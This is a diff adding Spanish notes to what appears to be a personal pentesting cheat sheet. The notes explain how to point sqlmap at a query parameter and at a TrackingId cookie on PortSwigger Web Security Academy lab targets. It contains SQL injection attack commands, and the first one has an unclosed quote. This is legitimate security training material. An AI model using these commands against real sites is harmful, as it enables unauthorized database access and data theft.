@@ -2850,6 +2850,8 @@ End of line -> Ctrl + E
 
 1. Parameter injection:
 
+Después de copiar la petición ==> añadir `-p` con el parámetro a inyectar, en este caso, el de `Pets`. 
+
 ```
 sudo sqlmap -u 'https://0af7006b04464bd581c17078008200aa.web-security-academy.net/filter?category=Pets \
   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
@@ -2872,6 +2874,8 @@ sudo sqlmap -u 'https://0af7006b04464bd581c17078008200aa.web-security-academy.ne
 ```
 
 2. Cookie injection:
+
+Después de copiar la petición ==> añadir `--cookie=` con el valor que la cabecera `Cookie` y en el parámetro `-p` la cookie de las dos que queremos inyectar. En este caso, `TrackingId`. 
 
 ```
 sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.net/filter?category=Pets' \
